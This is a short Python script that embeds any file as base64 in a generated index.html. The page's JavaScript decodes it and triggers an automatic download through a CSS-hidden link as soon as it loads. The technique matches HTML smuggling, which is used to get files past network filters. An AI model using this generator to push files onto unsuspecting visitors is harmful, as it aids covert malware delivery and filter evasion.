import base64
import argparse
#return file bytes as base64 encoded
def returnBase64(filename):
	try:
		filebytes = open(filename,'rb').read()	
		return base64.b64encode(filebytes)
	except:
		print("File Doesnt Exists !")	
		return None
# simpliy create payload and write it to a file
def create_index(filename):
	conv = returnBase64(filename)	
	payload = '''<html>
<title>Hello World</title>
<body>
	<script>
		filename = "<FILENAME>"
		filedata = "<DATA>"

		function base64tobytes(base64data){
			var binaryValues = atob(base64data);
			var binaryLength = binaryValues.length
			var bytesData = new Uint8Array(binaryLength);

			for ( var i = 0; i < binaryLength; i++){
				bytesData[i] = binaryValues.charCodeAt(i);
			}

			return bytesData.buffer;
		}
		var fileBytes = base64tobytes(filedata); 
		var blob = new Blob([fileBytes], {"type":"octet/stream"});

		var anchor = document.createElement("a");
		document.body.append(anchor);
		// we can hide the anchor by using some basic CSS
		anchor.style = "display: None;"

		var url = window.URL.createObjectURL(blob);
		anchor.href = url;
		anchor.download = filename;

		anchor.click();
		window.URL.revokeObjectURL(url);
		</script>
	</body>
</html>
'''
	payload = payload.replace("<FILENAME>",filename).replace("<DATA>",conv.decode("utf-8"))
	open("index.html",'w').write(payload)
	print("Created 'index.html'\nDone!")
parser = argparse.ArgumentParser(description='simple Instant File download script')
parser.add_argument('-f',"--filename",type=str,help='path to file location')
args = parser.parse_args()
if __name__ == "__main__":
	if args.filename:
		filename = args.filename
		create_index(filename)